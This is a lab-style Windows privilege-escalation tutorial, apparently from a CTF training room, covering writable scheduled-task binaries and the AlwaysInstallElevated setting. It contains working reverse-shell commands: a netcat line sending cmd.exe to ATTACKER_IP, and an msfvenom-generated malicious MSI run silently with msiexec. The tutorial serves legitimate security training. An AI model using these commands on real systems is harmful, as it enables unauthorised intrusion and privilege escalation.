# Windows Privilege Escalation: Other Quick Wins

Privilege escalation is not always a challenge. Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access. These scenarios are more common in CTF events than in real penetration testing engagements. However, if none of the previously mentioned methods work, you can always revisit these techniques.

---

## Scheduled Tasks

By examining scheduled tasks on the target system, you may find a task that either has a missing binary or uses a binary you can modify.

### Listing Scheduled Tasks

You can list scheduled tasks using the `schtasks` command without any options. To retrieve detailed information about a specific task, use the following command:

```cmd
schtasks /query /tn vulntask /fo list /v
```

Example output:
```
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

Key parameters:
- **Task To Run**: Indicates the executable run by the scheduled task.
- **Run As User**: Specifies the user account used to execute the task.

If the current user can modify or overwrite the "Task To Run" executable, you can control what gets executed by the `taskusr1` user, enabling privilege escalation.

### Checking File Permissions

To check file permissions on the executable, use the `icacls` command:

```cmd
icacls c:\tasks\schtask.bat
```

Example output:
```
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

In this example, the `BUILTIN\Users` group has full access (`F`) to the task's binary. This allows you to modify the `.bat` file and insert a payload. For convenience, `nc64.exe` is located at `C:\tools`.

### Modifying the Task Binary

Replace the `.bat` file content to spawn a reverse shell:

```cmd
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Start a listener on the attacker machine:

```bash
nc -lvp 4444
```

When the scheduled task runs, you should receive a reverse shell with `taskusr1` privileges. To manually trigger the task (if permissions allow), use:

```cmd
schtasks /run /tn vulntask
```

Example reverse shell output:
```
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```

---

## AlwaysInstallElevated

Windows Installer files (`.msi`) are used to install applications. By default, they run with the privilege level of the user who starts them. However, if misconfigured, they can run with elevated privileges from any user account.

> **Note**: The `AlwaysInstallElevated` method will not work on this room's machine and is included for informational purposes only.

### Checking Registry Values

To exploit this vulnerability, two registry values must be set. Check them using:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Both values must be set for exploitation to be possible.

### Generating a Malicious MSI File

If the registry values are set, generate a malicious `.msi` file using `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

Start a Metasploit handler configured for the reverse shell. Transfer the `.msi` file to the target and execute it:

```cmd
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

This will provide a reverse shell with elevated privileges.